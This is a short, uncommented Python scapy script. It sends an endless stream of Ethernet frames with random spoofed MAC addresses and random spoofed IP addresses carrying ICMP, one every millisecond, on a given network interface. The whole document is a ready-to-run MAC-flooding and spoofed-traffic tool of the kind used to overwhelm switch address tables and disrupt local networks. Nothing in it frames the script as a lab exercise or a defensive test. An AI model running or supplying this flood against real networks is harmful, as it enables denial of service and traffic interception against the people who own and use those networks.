#!/usr/bin/python
#coding: utf-8

import sys
import time
from scapy.all import *

iface = "eth0"
if len(sys.argv) >= 2:
    iface = sys.argv[1]

while True:
    pkt = Ether(src=RandMAC('*:*:*:*:*:*'), dst=RandMAC('*:*:*:*:*:*'))  / \
    IP(src=RandIP('*.*.*.*'), dst=RandIP('*.*.*.*')) / ICMP()

    time.sleep(0.001)
    sendp(pkt, iface=iface, loop=0)

